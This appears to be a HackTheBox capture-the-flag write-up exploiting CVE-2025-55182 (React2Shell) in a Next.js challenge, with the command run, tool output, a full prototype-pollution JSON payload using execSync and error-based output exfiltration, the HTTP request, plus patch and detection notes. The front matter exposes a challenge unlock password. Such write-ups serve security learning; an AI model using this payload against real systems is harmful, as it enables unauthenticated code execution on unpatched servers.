---
title: "ReactOOPS"
platform: "HackTheBox"
category: "Web"
difficulty: "Very Easy"
date: 2025-12-20
os: "Linux"
active: true
hash_required: true
unlock_password: "HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}"
tags: ["web", "react", "nextjs", "rce", "cve-2025-55182", "prototype-pollution", "flight-protocol", "react-server-components"]
---

---

## Overview

**Platform:** HackTheBox
**Difficulty:** Very Easy
**Category:** Web Challenge

ReactOOPS is a web challenge featuring a Next.js application vulnerable to **CVE-2025-55182 (React2Shell)**, a critical unauthenticated Remote Code Execution vulnerability in React Server Components with a CVSS score of 10.0.

---

## Scope

```
Host              IP Address           Technology              Role
─────────────────────────────────────────────────────────────────────
TARGET            83.136.255.53:47014  Next.js 16.0.6 / React 19   Web App
```

---

## Executive Summary

The engagement identified a critical vulnerability:

- **CVE-2025-55182 (React2Shell)** - Prototype pollution in React's Flight protocol deserializer allows unauthenticated RCE
- **Error-based exfiltration** via NEXT_REDIRECT allows command output retrieval without callback server

**Risk Rating:** Critical (CVSS 10.0)

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│     Identify Next.js via x-powered-by header                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Source Analysis → Next.js 16.0.6 + React 19 (Vulnerable)   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     CVE-2025-55182 → Prototype Pollution → Flight Protocol     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Error-based Exfil → NEXT_REDIRECT → Flag in digest field   │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration

## 1.1 Initial Reconnaissance

```bash
┌──(root㉿exegol)-[/workspace]
└─# curl -I http://83.136.255.53:47014
HTTP/1.1 200 OK
x-powered-by: Next.js
content-type: text/html; charset=utf-8
date: Fri, 20 Dec 2025 12:34:56 GMT
connection: keep-alive
keep-alive: timeout=5
```

The `x-powered-by: Next.js` header identifies the target framework.

## 1.2 Source Code Analysis

Downloaded and extracted the challenge source:

```bash
┌──(root㉿exegol)-[/workspace]
└─# unzip -P hackthebox ReactOOPS.zip -d react_source
Archive:  ReactOOPS.zip
   creating: react_source/web_reactoops/
   creating: react_source/web_reactoops/challenge/
  inflating: react_source/web_reactoops/challenge/package.json
  inflating: react_source/web_reactoops/challenge/next.config.ts
  ...

┌──(root㉿exegol)-[/workspace]
└─# cat react_source/web_reactoops/challenge/package.json
{
  "name": "react2shell",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "next": "16.0.6",
    "react": "^19",
    "react-dom": "^19"
  }
}
```

**Critical findings:**
- **Next.js 16.0.6** - Vulnerable version
- **React ^19** - Vulnerable version
- Project name: `react2shell` - Clear hint at the vulnerability

## 1.3 Vulnerability Identification

Research reveals **CVE-2025-55182 (React2Shell)**:

| Attribute | Value |
|-----------|-------|
| CVE | CVE-2025-55182 |
| CVSS | 10.0 (Critical) |
| Type | Unauthenticated RCE |
| Affected React | 19.0.0 - 19.2.0 |
| Affected Next.js | 15.x - 16.x |

---

# Phase 2: Exploitation

## 2.1 Clone the PoC

```bash
┌──(root㉿exegol)-[/workspace]
└─# git clone https://github.com/p3ta00/react2shell-poc.git
Cloning into 'react2shell-poc'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (12/12), done.
Receiving objects: 100% (15/15), 8.92 KiB | 8.92 MiB/s, done.

┌──(root㉿exegol)-[/workspace]
└─# cd react2shell-poc
```

## 2.2 Verify Target is Vulnerable

```bash
┌──(root㉿exegol)-[/workspace/react2shell-poc]
└─# python3 react2shell-poc.py -t http://83.136.255.53:47014 --check

 ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
 ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║
 ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

    CVE-2025-55182 - React Server Components RCE
    Prototype Pollution → Flight Protocol → RCE
    For authorized security testing only

[*] Checking target: http://83.136.255.53:47014
[+] Target is running Next.js
[+] Next.js application detected
[!] Could not confirm vulnerability status - proceeding anyway
[+] Vulnerability check complete
```

## 2.3 Command Execution

```bash
┌──(root㉿exegol)-[/workspace/react2shell-poc]
└─# python3 react2shell-poc.py -t http://83.136.255.53:47014 -c "id"

 ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
 ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║
 ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

    CVE-2025-55182 - React Server Components RCE
    Prototype Pollution → Flight Protocol → RCE
    For authorized security testing only

[*] Checking target: http://83.136.255.53:47014
[+] Target is running Next.js
[+] Next.js application detected
[!] Could not confirm vulnerability status - proceeding anyway
[*] Target: http://83.136.255.53:47014
[*] Command: id
[*] Payload size: 283 bytes
[*] Sending error-exfil payload...
[+] Payload delivered to http://83.136.255.53:47014
[*] Response status: 500
[+] Command output extracted from response!

[+] Command output:
────────────────────────────────────────────────────────
uid=1000(node) gid=1000(node) groups=1000(node)
────────────────────────────────────────────────────────
```

**RCE confirmed!**

## 2.4 Interactive Shell Mode

```bash
┌──(root㉿exegol)-[/workspace/react2shell-poc]
└─# python3 react2shell-poc.py -t http://83.136.255.53:47014 -i

 ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
 ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║
 ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

    CVE-2025-55182 - React Server Components RCE
    Prototype Pollution → Flight Protocol → RCE
    For authorized security testing only

[*] Checking target: http://83.136.255.53:47014
[+] Target is running Next.js
[+] Next.js application detected
[!] Could not confirm vulnerability status - proceeding anyway
[+] Entering interactive mode
[*] Type 'exit' or 'quit' to exit
[*] Using error-based exfiltration (output in response)

react2shell> whoami
[*] Target: http://83.136.255.53:47014
[*] Command: whoami
[*] Payload size: 287 bytes
[*] Sending error-exfil payload...
[+] Payload delivered to http://83.136.255.53:47014
[*] Response status: 500
[+] Command output extracted from response!
────────────────────────────────────────────────────────
node
────────────────────────────────────────────────────────

react2shell> pwd
[*] Target: http://83.136.255.53:47014
[*] Command: pwd
[*] Payload size: 283 bytes
[*] Sending error-exfil payload...
[+] Payload delivered to http://83.136.255.53:47014
[*] Response status: 500
[+] Command output extracted from response!
────────────────────────────────────────────────────────
/app
────────────────────────────────────────────────────────

react2shell> ls -la
[*] Target: http://83.136.255.53:47014
[*] Command: ls -la
[*] Payload size: 286 bytes
[*] Sending error-exfil payload...
[+] Payload delivered to http://83.136.255.53:47014
[*] Response status: 500
[+] Command output extracted from response!
────────────────────────────────────────────────────────
total 16
drwxr-xr-x 1 node node 4096 Dec 15 10:22 .
drwxr-xr-x 1 root root 4096 Dec 20 12:30 ..
drwxr-xr-x 1 node node 4096 Dec 15 10:22 .next
-rw-r--r-- 1 root root   98 Dec 15 10:21 flag.txt
drwxr-xr-x 3 node node 4096 Dec 15 10:21 node_modules
-rw-r--r-- 1 node node  521 Dec 15 10:21 package.json
drwxr-xr-x 2 node node 4096 Dec 15 10:21 public
────────────────────────────────────────────────────────

react2shell> cat flag.txt
[*] Target: http://83.136.255.53:47014
[*] Command: cat flag.txt
[*] Payload size: 292 bytes
[*] Sending error-exfil payload...
[+] Payload delivered to http://83.136.255.53:47014
[*] Response status: 500
[+] Command output extracted from response!
────────────────────────────────────────────────────────
HTB{*****REDACTED*****}
────────────────────────────────────────────────────────

react2shell> exit
[*] Exiting interactive mode
```

**Flag captured!**

---

# Technical Deep Dive

## Vulnerability Analysis

The vulnerability exploits prototype pollution in React's Flight protocol deserializer:

**Payload Structure:**
```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\": \"$B0\"}",
  "_response": {
    "_prefix": "var res = execSync(cmd).toString(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

**Attack Chain:**
1. `$1:__proto__:then` - Traverses the prototype chain
2. `$1:constructor:constructor` - Accesses the Function constructor
3. `_prefix` - Contains our JavaScript payload
4. `NEXT_REDIRECT` error - Exfiltrates output in the `digest` field

## HTTP Request

```http
POST / HTTP/1.1
Host: 83.136.255.53:47014
Next-Action: x
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------boundary
Content-Disposition: form-data; name="1"

"$@0"
------boundary--
```

---

## Tools Used

- **curl** - Initial reconnaissance
- **react2shell-poc.py** - CVE-2025-55182 exploitation tool
- **Python requests** - HTTP payload delivery

---

## Key Vulnerabilities

| Vulnerability | Impact | Severity |
|--------------|--------|----------|
| CVE-2025-55182 - Prototype Pollution in Flight Protocol | Unauthenticated RCE | Critical (CVSS 10.0) |

---

## Mitigation

### Patched Versions

| Product | Patched Versions |
|---------|------------------|
| React | 19.0.1, 19.1.2, 19.2.1+ |
| Next.js | 15.0.5, 15.1.9, 15.2.6, 16.0.7+ |

### Detection

Look for:
- POST requests with `Next-Action` header
- Request bodies containing `__proto__` or `constructor:constructor`
- 500 errors with Flight protocol responses containing `digest`

---

## References

- [Wiz Security - React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [NVD - CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [PoC - p3ta00/react2shell-poc](https://github.com/p3ta00/react2shell-poc)
